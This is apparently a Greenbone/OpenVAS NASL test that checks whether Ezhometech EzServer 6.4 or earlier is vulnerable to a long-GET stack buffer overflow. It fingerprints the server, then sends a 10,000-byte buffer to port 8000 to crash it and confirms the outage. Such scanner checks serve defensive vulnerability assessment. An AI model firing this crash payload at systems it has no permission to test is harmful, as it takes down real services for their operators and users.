# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802438");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-06-20 17:01:48 +0530 (Wed, 20 Jun 2012)");
  script_name("Ezhometech Ezserver Long 'GET' Request Stack Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Denial of Service");
  script_require_ports("Services/www", 8000);
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://secunia.com/advisories/49568/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54056");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19291/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19266/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113860/ezserver_http.rb.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113851/ezhometechezserver-overflow.txt");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial of service condition.");
  script_tag(name:"affected", value:"Ezhometech EzServer version 6.4 and prior");
  script_tag(name:"insight", value:"Buffer overflow condition exist in URL handling, sending long
  GET request to the server on port 8000 will cause server process to exit.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"Ezhometech Ezserver is prone to a stack based buffer overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port( default:8000 );

sndReq = http_get( item:"/admin/index.htm", port:port );
rcvRes = http_keepalive_send_recv( port:port, data:sndReq );

if( isnull( rcvRes ) || ">Ezhometech<" >!< rcvRes ) exit( 0 );

soc = http_open_socket( port );
if( ! soc ) exit( 0 );


send(socket:soc, data:crap(data:raw_string(0x43), length: 10000));

http_close_socket(soc);

sleep(3);

sndReq = http_get( item:"/admin/index.htm", port:port );
rcvRes = http_send_recv( port:port, data:sndReq );

if( http_is_dead( port:port) && isnull( rcvRes ) && ">Ezhometech<" >!< rcvRes ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
